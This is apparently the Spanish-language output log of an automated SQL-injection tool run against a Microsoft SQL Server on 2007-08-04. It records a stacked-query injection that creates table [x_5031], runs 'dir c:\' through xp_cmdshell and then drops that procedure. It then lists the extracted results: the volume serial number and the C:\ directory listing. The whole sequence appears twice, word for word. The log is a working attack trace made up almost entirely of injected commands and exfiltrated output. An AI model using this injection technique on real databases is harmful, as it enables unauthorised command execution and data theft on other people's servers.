----------------------------------------------------------------
Accion:.............Comando: creacion de tabla y ejecucion de comando shell con insercion de datos..
Origen:.............200.47.17.118.
Fecha:..............2007-08-04.
Hora:...............22:07:36.
Resultado: se ha creado la tabla:[x_5031].
Resultado: se ha ejecutado el comando de shell: 'dir c:\';insert into [x_5031] values ('g_over');exec master.dbo.sp_dropextendedproc 'xp_cmdshell.

----------------------------------------------------------------
Accion:.............Extraccion de Informacion.
Origen:.............200.47.17.118.
Fecha:..............2007-08-04.
Hora:...............22:07:39.
Datos:.............._volume_serial_number_is_24ca-c152|.

----------------------------------------------------------------
Accion:.............Extraccion de Informacion.
Origen:.............200.47.17.118.
Fecha:..............2007-08-04.
Hora:...............22:07:40.
Datos:...............

----------------------------------------------------------------
Accion:.............Extraccion de Informacion.
Origen:.............200.47.17.118.
Fecha:..............2007-08-04.
Hora:...............22:07:40.
Datos:.............._directory_of_c:\|.

----------------------------------------------------------------
Accion:.............Extraccion de Informacion.
Origen:.............200.47.17.118.
Fecha:..............2007-08-04.
Hora:...............22:07:41.
Datos:...............

----------------------------------------------------------------
Accion:.............Extraccion de Informacion.
Origen:.............200.47.17.118.
Fecha:..............2007-08-04.
Hora:...............22:07:41.
Datos:..............21/07/2006__04:59p______<dir>__________ca_lic|.

----------------------------------------------------------------
Accion:.............Extraccion de Informacion.
Origen:.............200.47.17.118.
Fecha:..............2007-08-04.
Hora:...............22:07:42.
Datos:..............22/01/2007__06:26p______<dir>__________documents_and_settings|.

----------------------------------------------------------------
Accion:.............Extraccion de Informacion.
Origen:.............200.47.17.118.
Fecha:..............2007-08-04.
Hora:...............22:07:42.
Datos:..............14/07/2006__09:12p______<dir>__________drv|.

----------------------------------------------------------------
Accion:.............Extraccion de Informacion.
Origen:.............200.47.17.118.
Fecha:..............2007-08-04.
Hora:...............22:07:44.
Datos:..............30/08/2006__11:46a______<dir>__________inetpub|.

----------------------------------------------------------------
Accion:.............Extraccion de Informacion.
Origen:.............200.47.17.118.
Fecha:..............2007-08-04.
Hora:...............22:07:48.
Datos:.............._______________9_dir(s)___3.701.329.920_bytes_free|.

----------------------------------------------------------------
Accion:.............Comando: creacion de tabla y ejecucion de comando shell con insercion de datos..
Origen:.............200.47.17.118.
Fecha:..............2007-08-04.
Hora:...............22:07:36.
Resultado: se ha creado la tabla:[x_5031].
Resultado: se ha ejecutado el comando de shell: 'dir c:\';insert into [x_5031] values ('g_over');exec master.dbo.sp_dropextendedproc 'xp_cmdshell.

----------------------------------------------------------------
Accion:.............Extraccion de Informacion.
Origen:.............200.47.17.118.
Fecha:..............2007-08-04.
Hora:...............22:07:39.
Datos:.............._volume_serial_number_is_24ca-c152|.

----------------------------------------------------------------
Accion:.............Extraccion de Informacion.
Origen:.............200.47.17.118.
Fecha:..............2007-08-04.
Hora:...............22:07:40.
Datos:...............

----------------------------------------------------------------
Accion:.............Extraccion de Informacion.
Origen:.............200.47.17.118.
Fecha:..............2007-08-04.
Hora:...............22:07:40.
Datos:.............._directory_of_c:\|.

----------------------------------------------------------------
Accion:.............Extraccion de Informacion.
Origen:.............200.47.17.118.
Fecha:..............2007-08-04.
Hora:...............22:07:41.
Datos:...............

----------------------------------------------------------------
Accion:.............Extraccion de Informacion.
Origen:.............200.47.17.118.
Fecha:..............2007-08-04.
Hora:...............22:07:41.
Datos:..............21/07/2006__04:59p______<dir>__________ca_lic|.

----------------------------------------------------------------
Accion:.............Extraccion de Informacion.
Origen:.............200.47.17.118.
Fecha:..............2007-08-04.
Hora:...............22:07:42.
Datos:..............22/01/2007__06:26p______<dir>__________documents_and_settings|.

----------------------------------------------------------------
Accion:.............Extraccion de Informacion.
Origen:.............200.47.17.118.
Fecha:..............2007-08-04.
Hora:...............22:07:42.
Datos:..............14/07/2006__09:12p______<dir>__________drv|.

----------------------------------------------------------------
Accion:.............Extraccion de Informacion.
Origen:.............200.47.17.118.
Fecha:..............2007-08-04.
Hora:...............22:07:44.
Datos:..............30/08/2006__11:46a______<dir>__________inetpub|.

----------------------------------------------------------------
Accion:.............Extraccion de Informacion.
Origen:.............200.47.17.118.
Fecha:..............2007-08-04.
Hora:...............22:07:48.
Datos:.............._______________9_dir(s)___3.701.329.920_bytes_free|.

